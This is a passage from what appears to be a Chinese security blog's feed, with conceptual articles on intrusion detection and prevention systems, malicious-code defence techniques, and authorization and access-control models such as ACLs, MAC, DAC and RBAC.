title="2、入侵检测技术的发展趋势和发展历史"></a>2、入侵检测技术的发展趋势和发展历史</h3><p>IDS的发展已经历了四个主要阶段：<br>第一阶段是以基于协议解码和模式匹配为主的技术，其优点是对于已知的攻击行为非常有效，各种已知的攻击行为可以对号入座，误报率低；缺点是高超的黑客采用变形手法或者新技术可以轻易躲避检测，漏报率高。<br>第二阶段是以基于模式匹配、简单协议分析和异常统计为主的技术，其优点是能够分析处理一部分协议，可以进行重组；缺点是匹配效率较低，管理功能较弱。这种检测技术实际上是在第一阶段技术的基础上增加了部分对异常行为分析的功能。<br>第三阶段是以基于完全协议分析、模式匹配和异常统计为主的技术，其优点是误报率、漏报率和滥报率较低，效率高，可管理性强，并在此基础上实现了多级分布式的检测管理；缺点是可视化程度不高，防范及管理功能较弱。<br>第四阶段是以基于安全管理、协议分析、模式匹配和异常统计为主的技术，其优点是入侵管理和多项技术协同工作，建立全局的主动保障体系，具有良好的可视化、可控性和可管理性。以该技术为核心，可构造一个积极的动态防御体系，即IMS——入侵管理系统。</p><h3 id="3、入侵检测技术存在的问题"><a href="#3、入侵检测技术存在的问题" class="headerlink" title="3、入侵检测技术存在的问题"></a>3、入侵检测技术存在的问题</h3><p>入侵检测的原理主要包括误用检测和异常检测两种方式。误用检测主要根据已知的攻击模式进行检测，而异常检测则是首先总结正常操作应该具有的特征（用户轮廓），当用户活动与正常行为有重大偏离时即被认为是入侵。异常检测可以发现未知的攻击方法，但误报率较高。</p><p>IDS的特点包括监测速度快、隐蔽性好、视野更宽、较少的监测器、攻击者不易转移证据、操作系统无关性以及不占用被保护的系统资源等。这些特点使得IDS能够有效地发现并应对各种网络攻击。<br>但是，入侵检测技术在实际应用中依然存在很多问题：<br>1）误报<br>误报是指被入侵检测系统测出但其实是正常及合法使用受保护网络和计算机的警报。假警报不但令人讨厌，并且降低入侵检测系统的效率。攻击者可以而且往往是利用包结构伪造无威胁“正常”假警报，以诱使收受人把入侵检测系统关掉。<br>2）精巧及有组织的攻击<br>攻击可以来自四方八面，特别是一群人组织策划且攻击者技术高超的攻击，攻击者花费很长时间准备，并发动全球性攻击，要找出这样复杂的攻击是一件难事。<br>3）数据采集、数据分析方法不足<br>高速网络技术，尤其是交换技术以及加密信道技术的发展，使得通过共享网段侦听的网络数据采集方法显得不足，而巨大的通信量对数据分析也提出了新的要求。<br>4）检测模型始终落后于攻击者的新知识和技术手段</p><p>入侵检测系统构建模型始终落后于攻击者的新知识和技术手段。主要表现在以下几个方面：<br>a、攻击者利用加密技术欺骗IDS，躲避IDS的安全策略；<br>b、攻击者快速发动进攻，使IDS无法反应，大规模的攻击，使IDS判断出错；<br>c、直接破坏IDS；<br>d、智能攻击技术，边攻击边学习，变IDS为攻击者的工具。<br>在安全防御中，IDS与防火墙等其他安全设备协同工作，共同保护网络的安全。防火墙主要用于抵御外部网络的入侵，但对于内部攻击几乎束手无策。而IDS则作为防火墙的合理补充，帮助系统应对网络攻击，扩展了系统管理员在安全审计、监视、进攻识别和响应等方面的安全管理能力，提高了信息安全基础结构的完整性。</p><h2 id="二、入侵防御技术（IPS）"><a href="#二、入侵防御技术（IPS）" class="headerlink" title="二、入侵防御技术（IPS）"></a>二、入侵防御技术（IPS）</h2><h3 id="1、入侵防御技术的定义"><a href="#1、入侵防御技术的定义" class="headerlink" title="1、入侵防御技术的定义"></a>1、入侵防御技术的定义</h3><p>入侵防御系统（IPS： Intrusion Prevention System）是通过直接嵌入到网络流量中，预先对入侵活动和攻击性网络流量进行拦截，避免造成损失的主动防护系统。IPS通过一个网络接口接收来自外部系统的流量，经过检查确认其中不包含异常活动或可疑内容后，再通过另外一个端口将它传送到内部系统中，能够监视网络或网络设备的网络资料传输行为，并能即时中断、调整或隔离一些不正常或是具有伤害性的网络资料传输行为。</p><h3 id="2、IPS的工作原理"><a href="#2、IPS的工作原理" class="headerlink" title="2、IPS的工作原理"></a>2、IPS的工作原理</h3><p>入侵防御技术（IPS）是一种主动的安全防御技术，旨在防止恶意软件入侵和数据泄露。它通过实时监测和拦截网络流量中的威胁，保护网络和系统免受攻击。</p><p>IPS的工作原理包括以下几个步骤：</p><ol><li>数据包捕获：IPS通过在网络接口上捕获数据包来实时监测网络流量。这些数据包可以是流入或流出的，以全面检测潜在的威胁。</li><li>威胁识别：IPS使用先进的检测算法和特征库来识别恶意软件、恶意行为和其他潜在威胁。它还可以识别各种攻击类型，如SQL注入、跨站脚本攻击、缓冲区溢出等。</li><li>威胁拦截：一旦IPS识别到威胁，它会立即采取措施拦截恶意流量，以防止攻击成功。这些措施可能包括丢弃数据包、断开连接、隔离受感染的主机等。</li><li>警报与日志：IPS会生成警报和日志记录，以通知管理员存在威胁并提供详细信息。这些信息对于后续分析和改进安全策略非常有用。</li><li>自我保护：为了防止IPS自身被攻破，它通常具有自我保护机制。这些机制可能包括防火墙规则、白名单功能、进程保护等，以确保IPS的正常运行和有效性。<br>入侵防御技术（IPS）通过实时监测和拦截网络流量中的威胁，提供了一种有效的安全防御手段。它可以保护网络和系统免受各种攻击的侵害，并具有自我保护机制以确保其有效性。</li></ol><h3 id="3、IPS的功能特点和性能扩展"><a href="#3、IPS的功能特点和性能扩展" class="headerlink" title="3、IPS的功能特点和性能扩展"></a>3、IPS的功能特点和性能扩展</h3><h4 id="1）IPS-功能特点"><a href="#1）IPS-功能特点" class="headerlink" title="1）IPS-功能特点"></a>1）IPS-功能特点</h4><p>IPS是一种防御深层入侵行为的串接部署设备。自IPS概念出现以来，用户和厂商的最大困惑就是：如何确保IPS无误报和滥报，在实时发现攻击行为的同时，保证IPS不会成为新的网络故障点。未解决这个问题，IPS具有其独特的功能特点：<br>（1）精确阻断<br>IPS的重点就是要达到精确阻断，即精确判断各种深层的攻击行为，并实现实时的阻断。 确保中断、调整或隔离的是不正常或是具有伤害性的网络行为。<br>（2）深层防御<br>IPS的第二个重点就是防御各种深层入侵行为，这也是IPS系统区别于其他安全产品的本质特点。即在确保精确阻断的基础上，尽量多地发现攻击行为，如SQL注入攻击、缓冲区溢出攻击、恶意代码攻击、后门、木马、间谍软件等达到深层防御。 </p><h4 id="2）IPS-性能扩展"><a href="#2）IPS-性能扩展" class="headerlink" title="2）IPS-性能扩展"></a>2）IPS-性能扩展</h4><p>IPS常用的攻击检测方法有两种：一种方法是通过定义攻击行为的数据特征来实现对已知攻击的检测，其优势是技术上实现简单、易于扩充、可迅速实现对特定新攻击的检测和拦截，但仅能识别已知攻击、抗变种能力弱；另一种方法是通过分析攻击产生原理，定义攻击类型的统一特征，能准确识别基于相同原理的各种攻击、不受攻击变种的影响，但技术门槛高、扩充复杂、应对新攻击速度有限。 </p><h3 id="4、IPS的优势和弱点"><a href="#4、IPS的优势和弱点" class="headerlink" title="4、IPS的优势和弱点"></a>4、IPS的优势和弱点</h3><p>实时检测与主动防御是IPS最为核心的设计理念，也是其区别于防火墙和IDS的立足之本。为实现这一理念，IPS在如下四个方面实现了技术突破，形成了不可低估的优势：<br>1）在线安装<br>IPS保留IDS实时检测的技术与功能，但是却采用了防火墙式的在线安装，即直接嵌入到网络流量中，通过一个网络端口接收来自外部系统的流量，经过检查确认其中不包含异常活动或可疑内容后，再通过另外一个端口将它传送到内部系统中；<br>2）实时阻断<br>IPS具有强有力的实时阻断功能，能够预先对入侵活动和攻击性网络流量进行拦截，避免其造成任何损失；<br>3）先进的检测技术<br>主要是并行处理检测和协议重组分析。所谓并行处理检测是指所有流经IPS的数据包，都采用并行处理方式进行过滤器匹配，实现在一个时钟周期内，遍历所有数据包过滤器；<br>4）特殊规则植入功能<br>IPS允许植入特殊规则以阻止恶意代码。IPS能够辅助实施可接收应用策略（AUP），如禁止使用对等的文件共享应用和占有大量带宽的免费互联网电话服务工具等。</p><p>尽管如此，IPS仍有其不可忽视的弱点：<br>1）总体拥有成本高<br>高可用性实时计算需求决定了IPS必须选用高端的专用计算设备，使其成本相对较高。<br>2）单点故障<br>IPS的阻断能力决定其必须采用网络嵌入模式，而这就可能造成单点故障。<br>3）性能瓶颈<br>即使IPS设备不出现故障，它仍然是一个潜在的网络瓶颈，不仅会增加滞后时间，而且会降低网络的效率，因此，绝大多数高端IPS产品供应商都通过使用自定义硬件（FPGA、网络处理器或者ASIC芯片）来提高IPS的运行效率，以减少其对于业务网络的负面影响。<br>4）误报与漏报<br>在网络流量几乎成几何级数增加的情况下，一旦生成警报，最基本的要求就是不让“误报”有可乘之机，导致合法流量也很有可能被意外拦截。</p><p>入侵检测系统（IDS）和入侵防御系统（IPS）都是重要的网络安全工具，但在工作方式和使用场景上有所不同。<br>IDS被视为审计类产品，主要关注于对网络或系统中的事件进行实时检测，并根据规则进行安全审计。它能够及时发现并警告系统管理员是否有入侵行为，并提供对内部攻击、外部攻击和误操作的实时保护。IDS可以分析计算机网络或系统中的关键信息，检查是否有违反安全策略的行为或被攻击的迹象。当有问题发生时，IDS会产生警报。IDS较多应用在防火墙之后，作为第二道安全闸门来提供额外的安全层。</p><p>相比之下，IPS被视为一种主动的、智能的入侵检测和防范系统。IPS不仅具备IDS的功能，而且能通过响应方式实时地终止入侵行为的发生和发展。它不仅能检测攻击，还能有效阻断攻击，提供实时的保护。IPS注重主动防御，可以设置过滤器来分析数据包，阻断恶意内容的数据包，并接受进一步检查的可疑数据包。IPS的关键技术包括主动防御技术、防火墙与IPS互动技术、集成多种检测技术和硬件加速系统等。</p><p>简而言之，IDS和IPS在网络安全中都发挥着重要作用。IDS主要侧重于检测入侵行为并提供警告，而IPS则更注重主动防御和实时阻断攻击。两者可以结合使用，共同为网络和系统提供更全面和有效的安全保护。</p><hr><p>博客：<a href="http://xiejava.ishareread.com/" target="_blank" rel="noopener">http://xiejava.ishareread.com/</a></p><center> <br><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/fullbug%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7.jpg" alt="“fullbug”微信公众号" title="“fullbug”微信公众号"> </p><p>关注：微信公众号,一起学习成长！</center></p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>安全防御之恶意代码与防护技术</title>
      <link href="/posts/dd90733e/"/>
      <url>/posts/dd90733e/</url>
      
        <content type="html"><![CDATA[<p>恶意代码是指没有作用却会带来危险的代码。通常把未经授权便干扰或破坏计算机系统、网络功能的程序或代码（一组指令）称之为恶意程序。恶意程序包括计算机病毒、木马、蠕虫等。详见<a href="http://xiejava.ishareread.com/posts/72d6b06f/" target="_blank" rel="noopener">《网络安全之恶意代码》</a><br>恶意代码的防范，不是单靠一种或几种技术就能解决的，而要靠技术、管理以及用户安全意识的共同防范，只有三者相结合才能最大程度地防止恶意代码对系统和用户信息的破坏。<br>目前，恶意代码防范方法主要分为两方面：基于主机的恶意代码防范方法和基于网络的恶意代码防范方法。</p><h2 id="一、主机恶意代码防范"><a href="#一、主机恶意代码防范" class="headerlink" title="一、主机恶意代码防范"></a>一、主机恶意代码防范</h2><p>基于主机的恶意代码防范方法是目前检测恶意代码最常用的技术，具体分为：基于特征的扫描技术、校验和检测法和安全操作系统对恶意代码的防范等。</p><h3 id="1、基于特征的扫描技术"><a href="#1、基于特征的扫描技术" class="headerlink" title="1、基于特征的扫描技术"></a>1、基于特征的扫描技术</h3><p>基于特征的扫描技术的基本思想是模式匹配。在扫描程序工作之前，必须先建立恶意代码特征库，根据特征库中的特征串，在所有被扫描文件中进行匹配查找。用户通过更新特征库，查找最新的恶意代码版本。</p><h3 id="2、校验和检测法"><a href="#2、校验和检测法" class="headerlink" title="2、校验和检测法"></a>2、校验和检测法</h3><p>校验和检测法是一种保护信息资源完整性的控制技术，例如Hash值、循环冗余码等。只要文件内部有一个比特发生了变化，校验和的值就会改变。未被恶意代码感染的系统首先会生成检测数据，然后周期性地使用校验和检测文件的改变情况。<br>虽然校验和检测法可以检测未知恶意代码对文件的修改，但同样也存在不足：<br>（1）校验和检测法实际上不能检测文件是否被恶意代码感染，它只是查找变化。即使发现恶意代码造成了文件的改变，校验和检测法也无法将恶意代码消除，也不能判断文件究竟被何种恶意代码感染。<br>（2）恶意代码可以采用多种手段绕开校验和检测法，使之文件改变难以被检测。</p><h3 id="3、安全操作系统对恶意代码的防范"><a href="#3、安全操作系统对恶意代码的防范" class="headerlink" title="3、安全操作系统对恶意代码的防范"></a>3、安全操作系统对恶意代码的防范</h3><p>在恶意代码入侵中，获得操作系统控制权，使操作系统为它分配系统资源是必经步骤。<br>操作系统的安全机制包括访问控制机制、主体标识与鉴别、安全审计、内存存取保护、文件系统保护、信息通路安全保护机制、最小特权管理、安全配置等。<br>（1）访问控制机制：操作系统的访问控制是操作系统安全控制保护中重要的一环，在身份识别的基础上，根据身份对提出的资源访问请求加以控制。<br>（2）主体标识与鉴别：标识与鉴别机制用于保证只有合法的用户才能存取系统中的资源，发生在用户登录系统时，用于识别每个用户的真实身份。标识鉴别机制的设计和实现需要达到两个方面的要求：协助安全操作系统实现新增的安全功能和安全策略，包括增加用户属性，并通过扩展标识鉴别命令来支持这些属性；<br>（3）安全审计：对系统中有关安全的活动进行记录、检查、及审核，目的在于检测和阻止非法用户对计算机系统的入侵，并显示合法用户的误操作。<br>（4）内存存取保护：防止主存储器中有限个程序的相互干扰和保护其中有限区域内的信息安全，限定各程序在规定的主存区域内，称为存储保护，内存存取保护是安全操作系统中一个最基本的要求，也是最基本的安全机制，主要是保护用户在存储器中的数据，在操作系统设计之初，针对内存通常是分块管理的，现在多采用基于页的存储管理方式。<br>（5）文件系统保护：文件系统是文件命名、存储和组织的总体结构，是计算机系统和网络的重要资源，文件系统的安全保护措施主要在分区、文件系统的安全加载、文件共享安全和文件系统的数据备份这四个方面。<br>（6）信息通路安全保护机制：即对信息在操作系统中经过的道路的保护，涉及两个方面：一方面对显式信息道路的保护，防止非法信息经过显式道路；另一方面，要堵住隐蔽的新系统了，防止恶意用户通过隐蔽信道进出。<br>（7）最小特权管理：最小特权是指在完成某种操作时所赋予系统中每个主体必不可少的特权。<br>（8）安全配置：做好操作系统安全设置，主要包括以下几个方面：操作系统安全策略、关闭不必要的服务、关闭不必要的端口、开启审核策略、开启密码策略、开启账户策略、备份敏感文件、不显示上次登陆名、禁止建立空连接和下载最新补丁等。</p><h2 id="二、网络恶意代码防范"><a href="#二、网络恶意代码防范" class="headerlink" title="二、网络恶意代码防范"></a>二、网络恶意代码防范</h2><p>由于恶意代码具有相当的复杂性和行为不确定性，恶意代码的防范需要多种技术综合应用。基于网络的恶意代码防范方法包括：恶意代码检测防御和恶意代码预警。<br>其中常见的恶意代码检测防御包括：基于GRIDS的恶意代码检测、基于PLD硬件的检测防御、基于Honey Pot的检测防御和基于CCDC的检测防御。</p><h3 id="1、基于GRIDS的恶意代码检测"><a href="#1、基于GRIDS的恶意代码检测" class="headerlink" title="1、基于GRIDS的恶意代码检测"></a>1、基于GRIDS的恶意代码检测</h3><p>著名的GRIDS主要针对大规模网络攻击和自动化入侵设计的，它收集计算机和网络活动的数据以及它们之间的连接，在预先定义的模式库的驱动下，将这些数据构建成网络活动行为来表征网络活动结构上的因果关系。</p><h3 id="2、基于PLD硬件的检测防御"><a href="#2、基于PLD硬件的检测防御" class="headerlink" title="2、基于PLD硬件的检测防御"></a>2、基于PLD硬件的检测防御</h3><p>华盛顿大学应用研究室的John W.  Lockwood、James Moscola1和Matthew Kulig等提出了一种采用可编程逻辑设备（PLD，Programmable Logic Devices）对抗恶意代码的防范系统。PLD由三个相互内联部件DED（Data Enabling Device）、CMS（Content Matching Server）和RTP（Regional Transaction Processor）组成。</p><h3 id="3、基于Honey-Pot的检测防御"><a href="#3、基于Honey-Pot的检测防御" class="headerlink" title="3、基于Honey Pot的检测防御"></a>3、基于Honey Pot的检测防御</h3><p>Honey Pot，即蜜罐技术，其主要功能是对系统中所以操作和行为进行监视和记录，可以使网络安全专家通过精心的伪装，是的攻击者在进入到目标西后仍不知道自己的行为已经处于系统的监视之下。Honey Pot的设计初衷就是让黑客入侵，借此收集证据，同时隐藏真实的服务器地址，用于防范网络黑客攻击。</p><h3 id="4、基于CCDC的检测防御"><a href="#4、基于CCDC的检测防御" class="headerlink" title="4、基于CCDC的检测防御"></a>4、基于CCDC的检测防御</h3><p>由于主动式传播恶意代码具有生物病毒特征，美国安全专家提议建立CCDC（The Cyber Centers for Disease Control）来对抗恶意代码攻击。<br>CCDC能够实现对大规模恶意代码入侵的预警、防御和阻断，但CCDC也存在一些问题：<br>（1）CCDC是一个规模庞大的防范体系，要考虑体系运转的代价；<br>（2）由于CCDC体系的开放性，CCDC自身的安全问题不容忽视；<br>（3）在CCDC防范体系中，攻击者能够监测恶意代码攻击的全过程，深入理解CCDC防范恶意代码的工作机制，因此可能导致突破CCDC防范体系的恶意代码出现。</p><h2 id="三、防护技术"><a href="#三、防护技术" class="headerlink" title="三、防护技术"></a>三、防护技术</h2><p>防病毒技术就是通过一定的技术手段防止计算机病毒对系统的传染和破坏。但是随着Internet技术的发展，以及E-mail和一批网络工具的出现，在改变人类信息传播方式的同时也使计算机病毒的种类迅速增加，扩散速度也大大加快，计算机病毒的传播方式迅速突破地域的限制，由以往的单机之间的介质传染转换为网络系统间的传播。现在，计算机病毒已经可以通过移动磁盘、光盘、局域网、www浏览、E-Mail， FTP下载等多种方式传播。</p><p>为了对抗恶意代码的威胁，安全防护技术采用多层次的策略和工具来检测、阻止和清除这些恶意软件。以下是一些常见的恶意代码防护技术：</p><ol><li>防病毒软件： 防病毒软件是最基本也是最常见的恶意代码防护工具。它通过使用病毒定义数据库和启发式分析等技术，检测并阻止已知和新的恶意代码。</li><li>反恶意代码行为分析： 这种方法不仅关注已知的病毒特征，还通过分析应用程序的行为来检测潜在的恶意活动。这包括监测文件、注册表、进程和网络活动等。</li><li>沙盒技术： 沙盒是一种隔离环境，允许在受控制的环境中运行不明文件或程序，以观察其行为。沙盒技术有助于发现和分析未知的恶意代码。</li><li>入侵检测和入侵防御系统（IDS/IPS）： IDS和IPS系统监控网络流量和系统活动，检测潜在的恶意行为，并采取措施以阻止入侵。</li><li>网络防火墙： 防火墙通过控制网络流量和阻止恶意流量来防御网络攻击，包括恶意代码传播。</li><li>安全补丁和更新管理： 及时应用操作系统和应用程序的安全更新和补丁是防止恶意代码利用系统漏洞的关键步骤。</li><li>应用白名单： 白名单技术允许系统管理员定义可执行文件和应用程序的白名单，只有在白名单上的程序才能运行，从而减少潜在的恶意代码执行。</li><li>电子邮件过滤和安全网关： 通过检测和阻止恶意附件、链接或恶意代码传播的电子邮件，电子邮件过滤和安全网关有助于防范针对用户的社交工程攻击。</li><li>安全教育和培训： 提供员工和用户有关社交工程攻击、恶意代码的风险以及如何防范的培训是预防恶意代码感染的重要方面。</li><li>端点安全： 通过在终端设备上使用终端防护软件，可以检测和防止恶意代码的传播和执行。</li><li>安全漏洞管理： 定期评估和管理系统和应用程序的安全漏洞，以及修补这些漏洞，是防止恶意代码利用的一项重要措施。</li></ol><p>这些技术通常以综合的方式使用，以提供更强大的恶意代码防护能力。保持技术的更新，及时应用安全补丁，以及教育用户避免潜在的风险都是有效防范恶意代码攻击的关键。</p><hr><p>博客：<a href="http://xiejava.ishareread.com/" target="_blank" rel="noopener">http://xiejava.ishareread.com/</a></p><center> <br><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/fullbug%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7.jpg" alt="“fullbug”微信公众号" title="“fullbug”微信公众号"> </p><p>关注：微信公众号,一起学习成长！</center></p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>安全防御之授权和访问控制技术</title>
      <link href="/posts/54b08069/"/>
      <url>/posts/54b08069/</url>
      
        <content type="html"><![CDATA[<p>授权和访问控制技术是安全防御中的重要组成部分，主要用于管理和限制对系统资源（如数据、应用程序等）的访问。授权控制用户可访问和操作的系统资源，而访问控制技术则负责在授权的基础上，确保只有经过授权的用户才能访问相应的资源。</p><h2 id="一、授权"><a href="#一、授权" class="headerlink" title="一、授权"></a>一、授权</h2><p>授权技术通常包括身份认证和权限管理。<br>身份认证是验证用户身份的过程，确保用户是系统中的合法用户；<br>权限管理则是根据用户的角色和身份，为其分配相应的访问权限。通过授权技术，可以有效地防止非法用户或未授权的用户访问系统资源，从而保护系统的安全。<br>授权是确定用户访问权限的机制。用户访问权限必须始终遵循最小特权原则，该原则规定用户只拥有执行他们的作业功能所必须的访问权限，而不能拥有其他权限。为了保证网络资源在受控、合法地情况下使用，用户只能根据自己的权限大小访问系统资源，不得越权访问。</p><h2 id="二、访问控制"><a href="#二、访问控制" class="headerlink" title="二、访问控制"></a>二、访问控制</h2><p>访问控制是网络安全防范和保护的主要核心策略，它的主要任务是保证网络资源不被非法使用和访问。<br>访问控制包括三个要素：主体、客体和控制策略。<br>主体S（Subject）：是指提出访问资源具体请求或某一操作动作的发起者，但不一定是动作的执行者，可能是某一用户，也可以是用户启动的进程、服务和设备等。<br>客体O（Object）：是指被访问资源的实体。所有可以被操作的信息、资源、对象都可以是客体。客体可以是信息、文件、记录等集合体，也可以是网络上的硬件设施、无限通信中的终端，甚至可以包含另外一个客体。<br>控制策略A（Attribution）：是主体对客体的相关访问规则集合，即属性集合。访问策略体现了一种授权行为，也是客体对主体某些操作行为的默认。</p><h3 id="1、访问控制模型"><a href="#1、访问控制模型" class="headerlink" title="1、访问控制模型"></a>1、访问控制模型</h3><p>典型访问控制模型如图所示：<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2024/20240103/%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6%E6%A8%A1%E5%9E%8B.png" alt="在这里插入图片描述"></p><center>访问控制模型的组成</center><h3 id="2、访问控制的机制"><a href="#2、访问控制的机制" class="headerlink" title="2、访问控制的机制"></a>2、访问控制的机制</h3><p>访问控制机制是检测和防止系统被未授权访问，并保护资源所采取的各种措施。是在文件系统中广泛应用的安全防护方法，一般在操作系统的控制下，按照事先确定的规则决定是否允许主体访问客体，贯穿于系统全过程。<br>访问控制矩阵（Access Contro1 Matrix）是最初实现访问控制机制的概念模型，以二维矩阵规定主体和客体间的访问权限。行表示主体的访问权限属性，列表示客体的访问权限属性，矩阵格表示所在行的主体对所在列的客体的访问授权，空格为未授权，Y为有操作授权。以确保系统操作按此矩阵授权进行访问。通过引用监控器协调客体对主体访问，实现认证与访问控制的分离。在实际应用中，对于较大系统，由于访问控制矩阵将变得非常大，其中许多空格，造成较大的存储空间浪费，因此，较少利用矩阵方式，主要采用以下2种方法：<br>1）访问控制列表<br>访问控制列表（Access Control List，ACL）是应用在路由器接口的指令列表，用于路由器利用源地址、目的地址、端口号等的特定指示条件对数据包的抉择。是以文件为中心建立访问权限表，表中记载了该文件的访问用户名和隶属关系。利用ACL，容易判断出对特定客体的授权访问，可访问的主体和访问权限等。当将该客体的ACL置为空，可撤消特定客体的授权访问。<br>2）能力关系表<br>能力关系表（Capabilities List）是以用户为中心建立访问权限表。与ACL相反，表中规定了该用户可访问的文件名及权限，利用此表可方便地查询一个主体的所有授权。相反，检索具有授权访问特定客体的所有主体，则需查遍所有主体的能力关系表。</p><h3 id="3、访问控制的策略"><a href="#3、访问控制的策略" class="headerlink" title="3、访问控制的策略"></a>3、访问控制的策略</h3><p>访问控制的安全策略是指在某个自治区域内（属于某个组织的一系列处理和通信资源范畴），用于所有与安全相关活动的一套访问控制规则。访问控制的安全策略有三种类型：基于身份的安全策略、基于规则的安全策略和综合访问控制方式。</p><h4 id="1）基于身份的安全策略"><a href="#1）基于身份的安全策略" class="headerlink" title="1）基于身份的安全策略"></a>1）基于身份的安全策略</h4><p>基于身份的策略包括基于个体的策略和基于组的策略。</p><ul><li>基于个体的策略：一个基于个体的策略根据哪些用户可对一个目标实施哪一种行为的列表来表示。这个等价于用一个目标的访问矩阵列来描述。</li><li>基于组的策略：一个基于组的策略是基于身份的策略的另一种情形，一些用户被允许对一个目标具有同样的访问许可。</li></ul><h4 id="2）基于规则的安全策略"><a href="#2）基于规则的安全策略" class="headerlink" title="2）基于规则的安全策略"></a>2）基于规则的安全策略</h4><p>基于规则的策略包括多级策略和基于间隔的策略。<br>多级策略：通过分配给每个目标一个密级来操作。密级由低到高分为：无密级、限制、机密、秘密、绝密。每个用户从相同的层次中分配一个等级。<br>基于间隔的策略：在基于间隔的策略中，目标集合关联于安全间隔或安全类别，通过他们来分离其他目标。用户需要给一个间隔分配一个不同的等级，以便能够访问间隔中的目标。</p><h4 id="3）综合访问控制方式"><a href="#3）综合访问控制方式" class="headerlink" title="3）综合访问控制方式"></a>3）综合访问控制方式</h4><p>综合访问控制策略（HAC）继承和吸取了多种主流访问控制技术的优点，有效地解决了信息安全领域的访问控制问题，保护了数据的保密性和完整性，保证授权主体能访问客体和拒绝非授权访问。综合访问控制策略主要包括：</p><ul><li>入网访问控制<br>入网访问控制是网络访问的第一层访问控制。对用户可规定所能登入到的服务器及获取的网络资源，控制准许用户入网的时间和登入入网的工作站点。</li><li>网络的权限控制<br>网络的权限控制是防止网络非法操作而采取的一种安全保护措施。用户对网络资源的访问权限通常用一个访问控制列表来描述。</li><li>目录级安全控制<br>目录级安全控制主要是为了控制用户对目录、文件和设备的访问，或指定对目录下的子目录和文件的使用权限。用户在目录一级制定的权限对所有目录下的文件仍然有效，还可进一步指定子目录的权限。</li><li>属性安全控制<br>属性安全控制可将特定的属性与网络服务器的文件及目录网络设备相关联。在权限安全的基础上，对属性安全提供更进一步的安全控制。网络上的资源都应先标示其安全属性，将用户对应网络资源的访问权限存入访问控制列表中，记录用户对网络资源的访问能力，以便进行访问控制。</li><li>网络服务器安全控制<br>网络服务器安全控制允许通过服务器控制台执行的安全控制操作包括：用户利用控制台装载和卸载操作模块、安装和删除软件等。操作网络服务器的安全控制还包括设置口令锁定服务器控制台，主要防止非法用户修改、删除重要信息。</li><li>网络监控和锁定控制<br>在网络系统中，通常服务器自动记录用户对网络资源的访问，如有非法的网络访问，服务器将以图形、文字或声音等形式向网络管理员报警，以便引起警觉进行审查。</li><li>网络端口和结点的安全控制<br>网络中服务器的端口常用自动回复器、静默调制解调器等安全设施进行保护，并以加密的形式来识别结点的身份。自动回复器主要用于防范假冒合法用户，静默调制解调器用于防范黑客利用自动拨号程序进行网络攻击。</li></ul><h3 id="4、访问控制技术"><a href="#4、访问控制技术" class="headerlink" title="4、访问控制技术"></a>4、访问控制技术</h3><p>访问控制技术则是在授权的基础上，进一步控制用户对系统资源的访问。它根据用户的角色和权限，决定用户可以访问哪些资源以及可以进行哪些操作。常见的访问控制技术包括：</p><ol><li>强制访问控制（Mandatory Access Control）：这是一种基于安全策略的访问控制方法，由系统管理员设定安全级别，并按照安全级别对资源进行访问控制。</li><li>自主访问控制（Discretionary Access Control）：这是一种基于用户身份的访问控制方法，由资源的拥有者自行设定访问权限。</li><li>基于角色的访问控制（Role-Based Access Control）：这是一种基于用户角色的访问控制方法，通过将权限分配给角色，再将角色分配给用户，来实现访问控制。</li></ol><h4 id="1）强制访问控制技术（Mandatory-Access-Control）"><a href="#1）强制访问控制技术（Mandatory-Access-Control）" class="headerlink" title="1）强制访问控制技术（Mandatory Access Control）"></a>1）强制访问控制技术（Mandatory Access Control）</h4><p>强制访问控制（MAC），将系统中的信息分密级和类进行管理，以保证每个用户只能访问到那些被标明可以由他访问的信息的一种访问约束机制。通俗的来说，在强制访问控制下，主体与客体都被标记了固定的安全属性（如安全级、访问权限等），在每次访问发生时，系统检测安全属性以便确定该主体是否有权访问该客体。基于规则的多级策略就是一种强制访问控制策略。</p><h4 id="2）自主访问控制技术（Discretionary-Access-Control）"><a href="#2）自主访问控制技术（Discretionary-Access-Control）" class="headerlink" title="2）自主访问控制技术（Discretionary Access Control）"></a>2）自主访问控制技术（Discretionary Access Control）</h4><p>自主访问控制又被称为“基于身份的访问控制”，允许合法用户以用户或用户组的身份访问策略规定的客体，同时阻止非授权用户访问客体。自主访问控制模型的特点是授权的实施主体（可以授权的主体、管理授权的客体、授权组）自主负责赋予和收回其他主体对客体资源的访问权限。<br>在自主访问控制机制中，存取模式主要有：</p><ul><li>读：允许主体对客体进行读和拷贝的操作。 </li><li>写：允许主体写入或修改信息，包括扩展、压缩机删除等。</li><li>执行：允许将客体作为一种可执行文件运行，在一些系统中该模式还需要同时拥有读模式。 </li><li>空模式：主体对客体不具有任何的存取权。</li></ul><p>自主访问控制的具体实施可采用以下四种方法：</p><ul><li>目录表<br>在目录表访问控制方法中，借用了系统对文件的目录管理机制，为每一个欲实施访问权限的主体建立一个能被其访问的“客体目录表（文件目录表）”。如某个主体的客体目录表可能是：<br>客体1 ：权限1 客体2：权限2…<br>客体目录表中各个客体的访问权限的修改只能由该客体的合法属主确定，不允许其他任何用户在客体目录表中进行写操作，否则将可能出现对客体访问权限的伪造。操作系统必须在客体的拥有者控制下维护所有的客体目录。</li><li>访问控制列表<br>访问控制列表是从客体角度进行设置的，是面向客体的访问控制。每个客体都有一个访问控制列表，用来说明有权访问该客体的所有主体及其访问权限。</li><li>访问控制矩阵<br>访问控制矩阵是对上面两种方法的综合，直观地看，访问控制矩阵是一张表格，每行代表一个主体，每列代表一个客体，表中纵横对应的项是该主体对该客体的访问权集合。</li><li>能力表<br>能力表是访问控制矩阵的改进，将矩阵的每一列作为一个客体而形成一个存取表，每个存取表只由主体、访问权集合组成。</li></ul><h4 id="3）基于角色的访问控制技术（Role-Based-Access-Control）"><a href="#3）基于角色的访问控制技术（Role-Based-Access-Control）" 